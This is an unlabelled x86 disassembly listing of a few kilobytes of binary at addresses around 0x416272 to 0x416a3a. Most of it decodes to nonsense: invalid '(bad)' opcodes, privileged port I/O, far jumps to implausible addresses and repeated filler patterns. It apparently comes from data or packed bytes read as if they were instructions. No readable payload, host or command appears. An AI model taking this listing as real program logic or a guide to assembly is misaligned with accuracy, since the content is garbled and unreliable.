  416272:	xor    al,dh
  416274:	jo     0x41628b
  416276:	and    esi,eax
  416278:	bound  eax,QWORD PTR [edi]
  41627a:	in     al,0x63
  41627c:	std    
  41627d:	fdiv   QWORD PTR [eax]
  41627f:	iret   
  416280:	jb     0x416297
  416282:	stc    
  416283:	cli    
  416284:	inc    ecx
  416285:	add    cl,bh
  416287:	not    BYTE PTR [ebx+0x6]
  41628a:	add    al,0xfb
  41628c:	arpl   WORD PTR [eax+esi*8],ax
  41628f:	sti    
  416290:	pop    esi
  416291:	(bad)  [edx]
  416293:	(bad)  
  416294:	jmp    DWORD PTR [ebp-0x3fac1831]
  41629a:	shr    esp,1
  41629c:	inc    eax
  41629d:	mov    esi,0xe973f1bf
  4162a2:	xor    bl,BYTE PTR [ebp-0x93965fe]
  4162a8:	bound  edi,QWORD PTR [ecx-0x5a00d9ce]
  4162ae:	(bad)  
  4162af:	out    0x4a,eax
  4162b1:	xchg   esi,eax
  4162b2:	xchg   esi,eax
  4162b3:	out    0x6b,al
  4162b5:	test   BYTE PTR [edx+edi*8+0x6b],ch
  4162b9:	mov    WORD PTR [edx+eax*8+0x6a],?
  4162bd:	test   BYTE PTR [ebx+0x63],dh
  4162c0:	std    
  4162c1:	shl    DWORD PTR [ebx],1
  4162c3:	fldenv [edx+0x75]
  4162c6:	retw   0x7d70
  4162ca:	ja     0x4162b1
  4162cc:	jno    0x41634c
  4162ce:	pusha  
  4162cf:	arpl   bp,di
  4162d1:	inc    eax
  4162d2:	add    BYTE PTR [eax],al
  4162d4:	xor    eax,0x4c4471d5
  4162d9:	out    0x62,eax
  4162db:	cmp    eax,0x416bf05a
  4162e0:	push   eax
  4162e1:	out    dx,eax
  4162e2:	outs   dx,DWORD PTR ds:[esi]
  4162e3:	add    BYTE PTR [ebx],bh
  4162e5:	sub    DWORD PTR [edi+0x6e],ecx
  4162e8:	jmp    0x77a9d354
  4162ed:	fs std 
  4162ef:	jmp    FWORD PTR ds:0x4772501a
  4162f5:	jnp    0x416359
  4162f7:	jae    0x416334
  4162f9:	sub    esi,DWORD PTR [edx]
  4162fb:	inc    esi
  4162fc:	xor    DWORD PTR [edx+0x70],ebp
  4162ff:	je     0x416319
  416301:	pop    ss
  416302:	sbb    BYTE PTR [edx],al
  416304:	inc    edi
  416305:	push   0x6a186e62
  41630a:	ins    BYTE PTR es:[edi],dx
  41630b:	arpl   WORD PTR ds:0xef00706b,di
  416311:	sbb    BYTE PTR [eax+0x72],dl
  416314:	pop    es
  416315:	jp     0x416379
  416317:	jae    0x416314
  416319:	sub    DWORD PTR [edx],esi
  41631b:	dec    esi
  41631c:	std    
  41631d:	pop    esi
  41631e:	jno    0x416320
  416320:	outs   dx,DWORD PTR ds:[esi]
  416321:	sbb    DWORD PTR [ebx+eax*2-0x7b],ecx
  416325:	ja     0x416394
  416327:	push   ebx
  416328:	jl     0x416392
  41632a:	data16 outs dx,BYTE PTR ds:[esi]
  41632c:	jg     0x416385
  41632e:	std    
  41632f:	inc    DWORD PTR [ebx]
  416331:	sbb    BYTE PTR [ecx+0x78],al
  416334:	shl    DWORD PTR [edx+0x4d],0x72
  416338:	add    BYTE PTR [eax],al
  41633a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41633b:	jns    0x41639f
  41633d:	jae    0x4162ea
  41633f:	push   ss
  416340:	lods   eax,DWORD PTR ds:[esi]
  416341:	add    cl,bl
  416343:	jae    0x4163b6
  416345:	push   ebp
  416346:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416347:	outs   dx,BYTE PTR ds:[esi]
  416348:	pop    esi
  416349:	outs   dx,BYTE PTR ds:[esi]
  41634a:	lods   al,BYTE PTR ds:[esi]
  41634b:	jp     0x4163af
  41634d:	fs popf 
  41634f:	pop    esi
  416350:	pusha  
  416351:	gs call 0x6b0c9c9
  416357:	push   esi
  416358:	data16 ins BYTE PTR es:[edi],dx
  41635a:	cld    
  41635b:	je     0x4163cc
  41635d:	add    BYTE PTR [ecx],dh
  41635f:	(bad)  
  416360:	fidiv  WORD PTR [ecx-0x29]
  416363:	xlat   BYTE PTR ds:[ebx]
  416364:	out    0x30,eax
  416366:	add    ecx,DWORD PTR [ebx]
  416368:	loopne 0x4163d5
  41636a:	lds    ebp,FWORD PTR [ecx+eax*1-0x77]
  41636e:	xor    DWORD PTR [esi],ebp
  416370:	mul    BYTE PTR [edx-0x70]
  416373:	daa    
  416374:	fist   WORD PTR [eax-0x5b]
  416377:	std    
  416378:	ficomp WORD PTR [esi-0x7c]
  41637b:	xor    ch,dl
  41637d:	inc    edi
  41637e:	jbe    0x416397
  416380:	jmp    0x1a0f3e6
  416385:	xchg   ebp,eax
  416386:	xor    DWORD PTR [edx],esi
  416388:	fbstp  TBYTE PTR [ebx+0x69]
  41638b:	cmp    ch,al
  41638d:	ins    BYTE PTR es:[edi],dx
  41638e:	push   ebx
  41638f:	or     al,0xe8
  416391:	inc    ebp
  416392:	arpl   WORD PTR [edx-0x18],sp
  416395:	push   eax
  416396:	gs cmp eax,0x6b445ee0
  41639c:	add    DWORD PTR [esi],ecx
  41639e:	add    BYTE PTR [eax],al
  4163a0:	xor    DWORD PTR [esi+0x584340ea],ebp
  4163a6:	in     al,0x73
  4163a8:	push   esp
  4163a9:	mov    dl,0xf0
  4163ab:	dec    bp
  4163ad:	imul   eax,DWORD PTR [ecx],0x60
  4163b0:	xor    DWORD PTR [esi-0x61efac16],ebp
  4163b6:	out    dx,al
  4163b7:	dec    edx
  4163b8:	adc    al,0x88
  4163ba:	mov    edi,0x1980c71
  4163bf:	or     eax,0x40eaae31
  4163c4:	add    ebx,DWORD PTR [eax-0x5beb8c1c]
  4163ca:	out    0x70,eax
  4163cc:	std    
  4163cd:	mov    esp,edi
  4163cf:	pusha  
  4163d0:	aam    0x6a
  4163d2:	add    ecx,esi
  4163d4:	xor    DWORD PTR [edx+0x13e862e5],eax
  4163da:	push   ebp
  4163db:	jmp    0x4163bf
  4163dd:	jmp    0x44b:0xddd7e847
  4163e4:	aam    0xef
  4163e6:	inc    ebx
  4163e7:	xor    eax,0xe84b3203
  4163ec:	retf   0x3c13
  4163ef:	push   es
  4163f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4163f1:	in     eax,0x36
  4163f3:	test   BYTE PTR [edi+0x5fe232f2],0x14
  4163fa:	sbb    al,0xf5
  4163fc:	xchg   ebx,eax
  4163fd:	out    0xd9,al
  4163ff:	xor    eax,0xe802f85f
  416404:	add    BYTE PTR [eax],al
  416406:	push   es
  416407:	popa   
  416408:	mov    bh,0x3
  41640a:	arpl   di,si
  41640c:	or     eax,0xcf786c9
  416411:	int    0x53
  416413:	fld    TBYTE PTR [ebx]
  416415:	cld    
  416416:	daa    
  416417:	adc    al,0x91
  416419:	add    eax,DWORD PTR [ebx+0x63d2cdf7]
  41641f:	neg    eax
  416421:	cli    
  416422:	fs repz ret 0x53ee
  416427:	xlat   BYTE PTR ds:[ebx]
  416428:	into   
  416429:	ret    0x60be
  41642c:	jle    0x416431
  41642e:	arpl   di,si
  416430:	(bad)
  416433:	icebp  
  416434:	mov    ecx,0xaff6f9de
  416439:	add    ebp,DWORD PTR [edx+edx*1-0x47]
  41643d:	fimul  WORD PTR ds:0x1cde96d1
  416443:	int    0x8b
  416445:	cli    
  416446:	inc    edi
  416447:	adc    al,0x23
  416449:	add    esp,ebx
  41644b:	test   BYTE PTR [ebp-0x7418fb42],0xcc
  416452:	rcr    edx,cl
  416454:	jmp    FWORD PTR [ebx+0x3300216a]
  41645a:	xor    al,dh
  41645c:	bound  ecx,QWORD PTR [esi+0x6c]
  41645f:	loop   0x4164c3
  416461:	dec    eax
  416462:	inc    ecx
  416463:	cmc    
  416464:	dec    eax
  416465:	dec    esp
  416466:	dec    edx
  416467:	and    DWORD PTR [eax],eax
  416469:	mov    BYTE PTR [eax],0x0
  41646c:	xor    eax,esi
  41646e:	bound  ecx,QWORD PTR [esi+0x5c]
  416471:	cmc    
  416472:	jae    0x41648b
  416474:	adc    ch,ah
  416476:	jb     0x4164c4
  416478:	out    0xe7,al
  41647a:	ds jmp 0x3b40bdb2
  416480:	idiv   al
  416482:	inc    edx
  416483:	nop    ebx
  416486:	push   ebp
  416487:	or     BYTE PTR [ecx],bl
  416489:	jecxz  0x4164ed
  41648b:	sub    BYTE PTR ds:0xd61aff4e,dh
  416491:	clc    
  416492:	dec    esp
  416493:	stc    
  416494:	pslld  mm0,QWORD PTR [eax-0x4]
  416498:	fsubr  st(5),st
  41649a:	(bad)  
  41649b:	dec    esi
  41649d:	ret    0xcc70
  4164a0:	fcomp  QWORD PTR [edi-0x3]
  4164a3:	add    dh,BYTE PTR [edx]
  4164a5:	fldenv [edx-0x23]
  4164a8:	mul    esp
  4164aa:	(bad)  
  4164ab:	fucomi st,st(0)
  4164ad:	mov    esi,0x5ff3cc6a
  4164b2:	std    
  4164b3:	enter  0xe98e,0x5e
  4164b7:	mov    ecx,0xff32249b
  4164bc:	jle    0x4164a9
  4164be:	imul   ebp,ecx,0x32
  4164c1:	inc    edi
  4164c2:	add    BYTE PTR [edx-0x7a940d66],bh
  4164c8:	(bad)  
  4164c9:	out    0x62,eax
  4164cb:	mov    cl,BYTE PTR [edi+0x62e3]
  4164d1:	add    cl,cl
  4164d3:	adc    ebp,DWORD PTR [edi+0x68]
  4164d6:	mov    ch,0x77
  4164d8:	imul   esi,DWORD PTR [ebx],0x6c642daa
  4164de:	fcom   QWORD PTR [edx]
  4164e0:	jne    0x4164e2
  4164e2:	and    DWORD PTR [esi+0x71],esi
  4164e5:	gs jmp 0x5e62:0x1b746275
  4164ed:	arpl   bx,si
  4164ef:	inc    esp
  4164f0:	outs   dx,DWORD PTR ds:[esi]
  4164f1:	ins    BYTE PTR es:[edi],dx
  4164f2:	or     DWORD PTR [eax],ebx
  4164f4:	ja     0x4164f6
  4164f6:	popa   
  4164f7:	jbe    0x41656a
  4164f9:	gs push 0x76
  4164fc:	bound  esi,QWORD PTR [ebx+ecx*2+0x62]
  416500:	bound  esp,QWORD PTR [ecx+0x34]
  416503:	jne    0x416557
  416505:	jb     0x416543
  416507:	pop    ecx
  416508:	std    
  416509:	jmp    DWORD PTR [edi]
  41650b:	jno    0x416578
  41650d:	imul   edi,esi,0x242e7173
  416513:	ins    BYTE PTR es:[edi],dx
  416514:	imul   eax,DWORD PTR [eax],0x744f17dd
  41651a:	jmp    0xfd59:0x11727141
  416521:	dec    eax
  416523:	pop    ss
  416524:	dec    edi
  416525:	je     0x416511
  416527:	inc    esp
  416528:	inc    eax
  416529:	push   0x3e4fea
  41652e:	les    edx,FWORD PTR [edi]
  416530:	dec    edi
  416531:	je     0x4165ad
  416533:	dec    esi
  416534:	ins    BYTE PTR es:[edi],dx
  416535:	dec    ecx
  416536:	add    BYTE PTR [eax],al
  416538:	jle    0x4165a8
  41653a:	add    BYTE PTR ds:[edi+edx*1+0x41da744f],cl
  416542:	jno    0x4165b6
  416544:	leave  
  416545:	adc    ch,dl
  416547:	add    bl,cl
  416549:	outs   dx,BYTE PTR ds:[esi]
  41654a:	outs   dx,DWORD PTR ds:[esi]
  41654b:	inc    ebx
  41654c:	xor    DWORD PTR [eax-0x5417b20f],ebx
  416552:	add    DWORD PTR [esi],ecx
  416554:	xor    BYTE PTR [edx-0x13],bh
  416557:	jno    0x41655b
  416559:	jmp    0x6d3fac4c
  41655e:	add    DWORD PTR [ecx-0x37],esi
  416561:	loopne 0x416550
  416563:	pop    esi
  416564:	loope  0x416529
  416566:	and    eax,0x3d0dd64
  41656b:	ss xor esp,edx
  41656e:	in     eax,0x62
  416570:	lds    ebp,FWORD PTR ds:0x1acd63e3
  416576:	add    al,0x2a
  416578:	xor    esi,edx
  41657a:	fidiv  WORD PTR [ebx-0x67]
  41657d:	(bad)  
  41657e:	lock jae 0x416514
  416581:	and    al,0xe6
  416583:	pop    esi
  416584:	test   BYTE PTR [eax],dl
  416586:	add    al,0x47
  416588:	xor    edx,edi
  41658a:	in     al,0x60
  41658c:	call   0x156:0xfefff010
  416593:	popa   
  416594:	xchg   BYTE PTR ds:0x675262e6,al
  41659a:	add    DWORD PTR [esi],esp
  41659c:	add    BYTE PTR [eax],al
  41659e:	xor    DWORD PTR [edx],ecx
  4165a0:	call   0xf159c811
  4165a5:	ins    BYTE PTR es:[edi],dx
  4165a6:	push   edx
  4165a7:	inc    edx
  4165a8:	loopne 0x41661d
  4165aa:	xor    DWORD PTR [edi+0x554c7101],esi
  4165b0:	(bad)  
  4165b2:	mov    esi,0x4c7101aa
  4165b7:	inc    edi
  4165b8:	loopne 0x41661a
  4165ba:	and    eax,0x313e016b
  4165bf:	cdq    
  4165c0:	loopne 0x416622
  4165c2:	daa    
  4165c3:	imul   eax,DWORD PTR [ecx],0x45
  4165c6:	xor    DWORD PTR [edx+ebx*4],edx
  4165c9:	loopne 0x4165cd
  4165cb:	loope  0x41655a
  4165cd:	loop   0x4165e8
  4165cf:	in     eax,dx
  4165d0:	xchg   esi,eax
  4165d1:	out    dx,eax
  4165d2:	jle    0x416631
  4165d4:	enter  0xdc03,0xc0
  4165d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165d9:	shl    dl,cl
  4165db:	bnd js 0x4165cd
  4165de:	jecxz  0x4165c3
  4165e0:	out    0x3,al
  4165e2:	in     al,0xe0
  4165e4:	jge    0x4165c8
  4165e6:	leave  
  4165e7:	and    BYTE PTR [ecx],bl
  4165e9:	es aad 0xef
  4165ec:	dec    edx
  4165ed:	add    al,0xfa
  4165ef:	adc    esp,DWORD PTR [ebx]
  4165f1:	in     eax,0xdf
  4165f3:	div    DWORD PTR [ebx]
  4165f5:	icebp  
  4165f6:	shl    ecx,cl
  4165f8:	push   ss
  4165f9:	repnz popf 
  4165fb:	test   BYTE PTR [edi-0x18],0x93
  4165ff:	shl    esi,cl
  416601:	add    eax,DWORD PTR [eax]
  416603:	add    BYTE PTR [esi+0x14],bh
  416606:	adc    al,0xe6
  416608:	mov    ch,ch
  41660a:	pop    es
  41660b:	loopne 0x416670
  41660d:	loope  0x416612
  41660f:	bnd jbe 0x4165f4
  416612:	add    eax,0x3f097de
  416617:	add    al,0x82
  416619:	loope  0x416626
  41661b:	repnz push ebx
  41661d:	out    dx,al
  41661e:	hlt    
  41661f:	and    eax,0x402f04d
  416624:	xor    DWORD PTR [edi+eiz*8],edx
  416627:	add    esi,DWORD PTR [ecx]
  416629:	adc    al,0xe7
  41662b:	add    esi,DWORD PTR [ecx]
  41662d:	adc    al,0xe7
  41662f:	add    esi,DWORD PTR [ecx]
  416631:	adc    al,0xe7
  416633:	add    esi,DWORD PTR [ecx]
  416635:	adc    al,0xe7
  416637:	add    esi,DWORD PTR [ecx]
  416639:	adc    al,0xe7
  41663b:	add    esi,DWORD PTR [ecx]
  41663d:	adc    al,0xe7
  41663f:	add    esi,DWORD PTR [ecx]
  416641:	adc    al,0x0
  416643:	jmp    0xe9417a7a
  416648:	xor    dl,BYTE PTR [eax+eax*1]
  41664b:	jmp    0xe9417a82
  416650:	xor    dl,BYTE PTR [eax+eax*1]
  416653:	jmp    0xe9417a8a
  416658:	xor    dl,BYTE PTR [eax+eax*1]
  41665b:	jmp    0xe9417a92
  416660:	xor    dl,BYTE PTR [eax+eax*1]
  416663:	jmp    0xe9417a9a
  416668:	add    BYTE PTR [eax],al
  41666a:	xor    dl,BYTE PTR [eax+eax*1]
  41666d:	jmp    0xe9417aa4
  416672:	xor    dl,BYTE PTR [eax+eax*1]
  416675:	jmp    0xe9417aac
  41667a:	xor    dl,BYTE PTR [eax+eax*1]
  41667d:	jmp    0xe9417ab4
  416682:	xor    dl,BYTE PTR [eax+eax*1]
  416685:	jmp    0xe9417abc
  41668a:	xor    dl,BYTE PTR [eax+eax*1]
  41668d:	jmp    0xe9417ac4
  416692:	xor    dl,BYTE PTR [eax+eax*1]
  416695:	jmp    0xe9417acc
  41669a:	xor    dl,BYTE PTR [eax+eax*1]
  41669d:	jmp    0xe9417ad4
  4166a2:	xor    dl,BYTE PTR [eax+eax*1]
  4166a5:	jmp    0xe9417adc
  4166aa:	xor    dl,BYTE PTR [eax+eax*1]
  4166ad:	jmp    0xe9417ae4
  4166b2:	xor    dl,BYTE PTR [eax+eax*1]
  4166b5:	jmp    0xe9417aec
  4166ba:	xor    dl,BYTE PTR [eax+eax*1]
  4166bd:	add    BYTE PTR [eax-0x67ffffe9],bl
  4166c3:	pop    ss
  4166c4:	add    BYTE PTR [eax],al
  4166c6:	mov    BYTE PTR [edi],dl
  4166c8:	add    BYTE PTR [eax],al
  4166ca:	mov    BYTE PTR [edi],dl
  4166cc:	add    BYTE PTR [eax],al
  4166ce:	add    BYTE PTR [eax],al
  4166d0:	cwde   
  4166d1:	pop    ss
  4166d2:	add    BYTE PTR [eax],al
  4166d4:	cwde   
  4166d5:	pop    ss
  4166d6:	add    BYTE PTR [eax],al
  4166d8:	ins    DWORD PTR es:[edi],dx
  4166d9:	dec    eax
  4166da:	int3   
  4166db:	int3   
  4166dc:	gs dec eax
  4166de:	int3   
  4166df:	int3   
  4166e0:	add    al,0x8f
  4166e2:	in     al,dx
  4166e3:	push   ecx
  4166e4:	mov    edx,0x298a07d1
  4166e9:	mov    WORD PTR [ebx-0x1],cs
  4166ec:	stos   BYTE PTR es:[edi],al
  4166ed:	jno    0x41674a
  4166ef:	ret    
  4166f0:	in     al,0x8e
  4166f2:	in     al,dx
  4166f3:	push   ecx
  4166f4:	ffreep st(2)
  4166f6:	xor    cl,cl
  4166f8:	aad    0x8e
  4166fa:	outs   dx,DWORD PTR ds:[esi]
  4166fb:	xor    BYTE PTR [edx-0x5874f41e],ch
  416701:	clc    
  416702:	mov    BYTE PTR [esi+0x39],al
  416705:	lea    eax,[ebx-0x4]
  416708:	stos   BYTE PTR es:[edi],al
  416709:	fstp   DWORD PTR [edi]
  41670b:	mov    ebx,DWORD PTR [edi-0x6c]
  41670e:	cmp    eax,0x8013856b
  416713:	aas    
  416714:	jp     0x4166f6
  416716:	add    ebx,ebp
  416718:	or     BYTE PTR [ebx-0x46f374a3],bh
  41671e:	ror    ah,0x84
  416721:	(bad)  
  416722:	in     al,dx
  416723:	adc    ebp,0x2f
  416726:	mov    DWORD PTR [ebp+0x29],eax
  416729:	lea    eax,[ebx-0x20]
  41672c:	stos   BYTE PTR es:[edi],al
  41672d:	enter  0x8bdf,0x64
  416731:	je     0x416734
  416733:	push   ecx
  416734:	add    BYTE PTR [eax],al
  416736:	add    eax,0xaae4538d
  41673b:	shl    bl,1
  41673d:	mov    ebp,DWORD PTR [ecx-0x24]
  416740:	add    BYTE PTR [ebp+0x39],cl
  416743:	lea    ecx,[ebx-0x8]
  416746:	mov    edx,0xf38bf7c0
  41674b:	das    
  41674c:	add    DWORD PTR [ebp+0x29],eax
  41674f:	lea    eax,[ebx-0x18]
  416752:	mov    edx,0xe08bf7c8
  416757:	xor    eax,DWORD PTR [ecx]
  416759:	push   ebp
  41675a:	sub    DWORD PTR [ebp-0x2f550fad],ecx
  416760:	test   DWORD PTR [ebx+0x4d00f7f9],0xfc4b8d39
  41676a:	jbe    0x41673c
  41676c:	repz add BYTE PTR [ecx],dh
  41676f:	adc    al,0x0
  416771:	jmp    0x4167ab
  416773:	(bad)  
  416774:	push   ebx
  416775:	hlt    
  416776:	mov    dl,0x55
  416778:	dec    DWORD PTR [eax+0x45895fe4]
  41677e:	cmp    DWORD PTR [esi-0x33950bb5],ecx
  416784:	pop    ss
  416785:	jae    0x416800
  416787:	lea    edx,[ebx-0x10]
  41678a:	stos   BYTE PTR es:[edi],al
  41678b:	push   ss
  41678c:	add    DWORD PTR [ebp+0x29],eax
  41678f:	mov    eax,DWORD PTR [ebx-0x24]
  416792:	fwait
  416793:	or     ch,BYTE PTR [eax-0x54]
  416796:	xor    edx,esp
  416798:	dec    DWORD PTR [edx+0x386c0000]
  41679e:	dec    edi
  41679f:	call   0x417b05
  4167a4:	mov    dl,0x50
  4167a6:	or     al,0x85
  4167a8:	icebp  
  4167a9:	fistp  WORD PTR [eax]
  4167ab:	mov    eax,DWORD PTR [eax+eiz*2+0x9c94589]
  4167b2:	mov    ch,0xc
  4167b4:	popa   
  4167b5:	mov    ecx,DWORD PTR [ebx-0x14]
  4167b8:	mov    edx,0x748bebbf
  4167bd:	pop    eax
  4167be:	mov    DWORD PTR [ecx+eiz*4],eax
  4167c1:	adc    eax,0x79a0843
  4167c6:	mov    DWORD PTR [ebp-0x5f],ecx
  4167c9:	xchg   ebp,eax
  4167ca:	mov    edi,0xefc7a804
  4167cf:	jmp    0x41679e
  4167d1:	and    eax,0xb7948bc0
  4167d6:	ror    ah,0x75
  4167d9:	dec    eax
  4167da:	int3   
  4167db:	int3   
  4167dc:	ins    DWORD PTR es:[edi],dx
  4167dd:	dec    eax
  4167de:	int3   
  4167df:	int3   
  4167e0:	gs dec eax
  4167e2:	int3   
  4167e3:	int3   
  4167e4:	add    al,0x8d
  4167e6:	in     al,dx
  4167e7:	adc    DWORD PTR [ebp-0x4],0xffffffe7
  4167eb:	add    eax,0x89fd595e
  4167f0:	in     al,dx
  4167f1:	imul   ecx,DWORD PTR [ecx-0x183ba6bb],0x29
  4167f8:	inc    esi
  4167f9:	pop    ecx
  4167fa:	std    
  4167fb:	xor    DWORD PTR [ebp+0x10],0xffffffa1
  4167ff:	mov    ah,0x0
  416801:	add    ah,bl
  416803:	sar    bh,cl
  416805:	addr16 in eax,dx
  416807:	adc    eax,0xc6ba0040
  41680c:	out    0x51,eax
  41680e:	push   ds
  41680f:	push   DWORD PTR [ebx-0x5eeb8fab]
  416815:	mov    eax,0x69ffd364
  41681a:	xor    esi,ebp
  41681c:	jmp    DWORD PTR [edi-0x13]
  41681f:	adc    eax,0xfef60040
  416824:	mov    bh,0x55
  416826:	jo     0x41683c
  416828:	xchg   DWORD PTR [ebp-0x27],eax
  41682b:	push   eax
  41682c:	inc    ebx
  41682d:	cld    
  41682e:	xor    DWORD PTR [eax+eax*1],edx
  416831:	add    dl,cl
  416833:	or     cl,BYTE PTR [ecx-0x3d6b32ab]
  416839:	add    DWORD PTR [eax+0x3c83fbbe],edi
  41683f:	pop    eax
  416840:	or     BYTE PTR [ebx+0x10],dh
  416843:	lea    eax,[ebx-0x4]
  416846:	mov    edx,0x338c8307
  41684b:	aam    0xff
  41684d:	push   eax
  41684e:	stos   BYTE PTR es:[edi],al
  41684f:	mov    esi,0xfe9652e7
  416854:	mov    bl,0x55
  416856:	lock adc ecx,DWORD PTR [ecx+0x48a854d]
  41685d:	(bad)  
  41685e:	lds    edi,FWORD PTR [esi+0x438a003e]
  416864:	mov    ebp,esp
  416866:	add    BYTE PTR [eax],al
  416868:	or     al,0x55
  41686a:	int3   
  41686b:	int3   
  41686c:	jne    0x4168b5
  41686e:	int3   
  41686f:	int3   
  416870:	ins    DWORD PTR es:[edi],dx
  416871:	inc    edi
  416872:	int3   
  416873:	int3   
  416874:	gs inc edi
  416876:	int3   
  416877:	int3   
  416878:	in     al,0x8c
  41687a:	in     al,dx
  41687b:	mov    eax,ds:0x3ec221
  416880:	dec    DWORD PTR [eax+eax*2+0x7c6aa30]
  416887:	ds mov eax,0xf25d07cc
  41688d:	dec    eax
  41688e:	int3   
  41688f:	int3   
  416890:	in     eax,dx
  416891:	dec    eax
  416892:	int3   
  416893:	int3   
  416894:	in     eax,0x48
  416896:	int3   
  416897:	int3   
  416898:	fs mov ebp,esp
  41689b:	mov    ebp,DWORD PTR [eax+ecx*1+0x50]
  41689f:	mov    ebp,DWORD PTR [esp+ecx*1+0x4f]
  4168a3:	call   FWORD PTR [eax+eiz*4]
  4168a6:	push   ebx
  4168a7:	inc    ecx
  4168a8:	xor    DWORD PTR [ecx+0x48f5ccc0],edi
  4168ae:	int3   
  4168af:	int3   
  4168b0:	in     eax,dx
  4168b1:	dec    eax
  4168b2:	int3   
  4168b3:	int3   
  4168b4:	in     eax,0x48
  4168b6:	int3   
  4168b7:	int3   
  4168b8:	fs mov ebp,esp
  4168bb:	adc    ebp,0xc
  4168be:	push   0x0
  4168c0:	dec    ebx
  4168c1:	adc    al,0x68
  4168c3:	fdiv   QWORD PTR [ebx]
  4168c5:	aam    0xff
  4168c7:	inc    BYTE PTR [esp+ebx*4+0x53]
  4168cb:	inc    ecx
  4168cc:	add    BYTE PTR [eax],al
  4168ce:	xor    DWORD PTR [ebp+0x6c09f843],ecx
  4168d4:	add    al,BYTE PTR [eax+0x31]
  4168d7:	mov    eax,DWORD PTR [ebx-0x8]
  4168da:	loope  0x416947
  4168dc:	mov    edx,0x815786ff
  4168e1:	les    ebp,FWORD PTR [ecx]
  4168e3:	lea    eax,[ebx-0x4]
  4168e6:	stos   BYTE PTR es:[edi],al
  4168e7:	leave  
  4168e8:	sqrtps xmm7,XMMWORD PTR [edx-0x45adf43f]
  4168ef:	rol    DWORD PTR [edi],1
  4168f1:	push   eax
  4168f2:	pop    esi
  4168f3:	sar    ebx,0x8b
  4168f6:	dec    esp
  4168f7:	mov    ecx,0x8ae4ccc0
  4168fc:	in     al,dx
  4168fd:	push   ecx
  4168fe:	outs   dx,BYTE PTR ds:[esi]
  4168ff:	sar    ebx,1
  416901:	add    BYTE PTR [ecx],dh
  416903:	adc    al,0x0
  416905:	jmp    0x41692f
  416907:	mov    eax,DWORD PTR [ebx-0x4]
  41690a:	mov    dl,0x53
  41690c:	dec    DWORD PTR [eax+0x4d89586c]
  416912:	sbb    eax,0xa2104b1b
  416917:	test   DWORD PTR [eax+0x53133955],0x29e36fc
  416921:	mov    ebp,DWORD PTR [eax+ecx*1+0x1]
  416925:	dec    ebp
  416926:	cmc    
  416927:	push   es
  416928:	mov    dh,0x11
  41692a:	sub    dl,BYTE PTR [edx+0x74]
  41692d:	pop    es
  41692e:	test   eax,0x14
  416933:	add    BYTE PTR [ecx],dh
  416935:	imul   eax,DWORD PTR [ebx+ebp*8],0x1
  416939:	and    eax,eax
  41693b:	mov    edx,esp
  41693d:	mov    eax,0x47f5ccc0
  416942:	int3   
  416943:	int3   
  416944:	in     eax,dx
  416945:	inc    edi
  416946:	int3   
  416947:	int3   
  416948:	in     eax,0x47
  41694a:	int3   
  41694b:	int3   
  41694c:	add    al,0x8b
  41694e:	in     al,dx
  41694f:	mov    ecx,0x1449
  416954:	adc    eax,0x2489078b
  416959:	add    al,0x56
  41695b:	inc    ecx
  41695c:	xor    DWORD PTR [ecx+0x4775ccc0],edi
  416962:	int3   
  416963:	int3   
  416964:	ins    DWORD PTR es:[edi],dx
  416965:	inc    edi
  416966:	int3   
  416967:	int3   
  416968:	gs inc edi
  41696a:	int3   
  41696b:	int3   
  41696c:	add    al,0x8b
  41696e:	in     al,dx
  41696f:	adc    DWORD PTR [ebp+0x3],0xffffff89
  416973:	inc    ebp
  416974:	sub    DWORD PTR [ebx+0x7310478],edx
  41697a:	test   BYTE PTR [eax-0x74ffebcf],cl
  416980:	hlt    
  416981:	or     ecx,DWORD PTR [ecx-0x156ccaaf]
  416987:	or     BYTE PTR [eax+0x69],ah
  41698a:	xchg   DWORD PTR [ebp+0x25],edx
  41698d:	mov    al,BYTE PTR [ebx+0x8]
  416990:	mov    dl,0x54
  416992:	or     BYTE PTR [ecx+0x45c56474],cl
  416998:	add    BYTE PTR [eax],al
  41699a:	adc    eax,0x31000015
  41699f:	imul   eax,DWORD PTR [edi],0x8158748b
  4169a5:	shl    DWORD PTR [eax],0x8b
  4169a8:	dec    ebx
  4169a9:	cld    
  4169aa:	stos   BYTE PTR es:[edi],al
  4169ab:	mov    edi,0x60843bfb
  4169b0:	jno    0x4169f8
  4169b2:	mov    edx,0x6c8bfbcf
  4169b7:	fs or  eax,0xbed33db7
  4169bd:	cli    
  4169be:	cmp    eax,0x3c03fa91
  4169c3:	and    cl,BYTE PTR [ecx+0x4b89bd45]
  4169c9:	lock es popf 
  4169cc:	adc    al,0x41
  4169ce:	mov    al,0x72
  4169d0:	std    
  4169d1:	rdtsc  
  4169d3:	adc    al,0x87
  4169d5:	push   ebp
  4169d6:	cdq    
  4169d7:	mov    DWORD PTR [ebx+0x8],eax
  4169da:	stos   BYTE PTR es:[edi],al
  4169db:	(bad)  
  4169dc:	or     eax,DWORD PTR [ebx]
  4169de:	cmp    DWORD PTR [ecx+0x10baf853],ecx
  4169e4:	lsl    esi,sp
  4169e7:	add    ecx,DWORD PTR [ecx+0x5389294d]
  4169ed:	or     al,0x32
  4169ef:	add    ecx,DWORD PTR [ecx+0x48b694d]
  4169f5:	or     cl,BYTE PTR [edx-0x55]
  4169f8:	mov    DWORD PTR [ebp+0x29],edx
  4169fb:	mov    DWORD PTR [ebx+0x8],eax
  4169fe:	add    BYTE PTR [eax],al
  416a00:	xor    dl,dl
  416a02:	add    ecx,DWORD PTR [ecx+0x6be70bec]
  416a08:	ds push ebp
  416a0a:	std    
  416a0b:	mov    ecx,DWORD PTR [edi+esi*4-0x40]
  416a0f:	int3   
  416a10:	test   BYTE PTR [ecx+0x301583ec],cl
  416a16:	mov    DWORD PTR [ebp+0x29],eax
  416a19:	mov    eax,DWORD PTR [ebx-0x1c]
  416a1c:	stos   BYTE PTR es:[edi],al
  416a1d:	(bad)  
  416a1e:	jecxz  0x4169ab
  416a20:	fs jo  0x416a24
  416a23:	push   ecx
  416a24:	inc    ebp
  416a25:	mov    edx,DWORD PTR [ebx-0x18]
  416a28:	stos   BYTE PTR es:[edi],al
  416a29:	into   
  416a2a:	out    0x8b,eax
  416a2c:	test   eax,0x31000093
  416a31:	mov    ecx,DWORD PTR [ebx-0x10]
  416a34:	mov    dl,0xd6
  416a36:	out    dx,eax
  416a37:	add    BYTE PTR [esi],ch
  416a39:	nop
  416a3a:	stc    
